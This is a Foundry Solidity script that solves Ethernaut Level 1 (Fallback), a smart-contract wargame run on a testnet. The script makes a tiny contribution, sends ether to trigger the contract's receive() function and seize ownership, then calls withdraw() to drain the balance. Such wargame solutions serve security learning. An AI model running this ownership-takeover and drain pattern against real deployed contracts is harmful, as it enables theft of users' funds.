// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Fallback.sol";

/**
 * @title FallbackExploit
 * @notice Ethernaut Level 1: Fallback Exploit
 * @dev Exploits the receive() function to claim ownership and drain funds
 * 
 * Attack Steps:
 * 1. Contribute a small amount (< 0.001 ether) to get into contributions mapping
 * 2. Send ether directly to trigger receive() and become owner
 * 3. Call withdraw() to drain all funds
 * 
 * Vulnerability: receive() doesn't check if contribution makes user largest contributor,
 * it just sets owner = msg.sender if any contribution exists.
 * 
 * Usage:
 * 1. Get instance address from https://ethernaut.openzeppelin.com/level/0x
 * 2. Set INSTANCE_ADDRESS below
 * 3. Run: forge script script/FallbackExploit.s.sol:FallbackExploit \
 *      --rpc-url $SEPOLIA_RPC --private-key $PRIVATE_KEY --broadcast -vvvv
 */
contract FallbackExploit is Script {
    
    // Replace with your deployed instance address
    address constant INSTANCE_ADDRESS = address(0x0); // TODO: Set your instance address
    
    function run() external {
        require(INSTANCE_ADDRESS != address(0), "ERROR: Set INSTANCE_ADDRESS!");
        
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);
        
        console.log("============================================================");
        console.log("Ethernaut Level 1: Fallback Exploit");
        console.log("============================================================");
        console.log("Attacker:", deployer);
        console.log("Target:", INSTANCE_ADDRESS);
        console.log("");
        
        Fallback target = Fallback(INSTANCE_ADDRESS);
        
        // Pre-attack state
        address initialOwner = target.owner();
        uint256 initialBalance = address(target).balance;
        console.log("Initial Owner:", initialOwner);
        console.log("Initial Balance:", initialBalance);
        console.log("");
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Step 1: Contribute small amount to be in contributions mapping
        console.log("Step 1: Contributing 1 wei...");
        target.contribute{value: 1}();
        console.log("  Contributed: 1 wei");
        
        // Step 2: Send ether directly to trigger receive() and become owner
        console.log("Step 2: Sending 1 wei to trigger receive()...");
        (bool success,) = address(target).call{value: 1}("");
        require(success, "Transfer failed");
        console.log("  Transfer successful");
        
        // Step 3: Withdraw all funds
        console.log("Step 3: Withdrawing all funds...");
        target.withdraw();
        
        vm.stopBroadcast();
        
        // Verify success
        address newOwner = target.owner();
        uint256 finalBalance = address(target).balance;
        
        console.log("");
        console.log("============================================================");
        console.log("New Owner:", newOwner);
        console.log("Final Balance:", finalBalance);
        console.log("");
        
        if (newOwner == deployer && finalBalance == 0) {
            console.log("SUCCESS! Exploit complete - ownership claimed and funds drained!");
        } else {
            console.log("FAILED! Check state variables.");
        }
        console.log("============================================================");
    }
}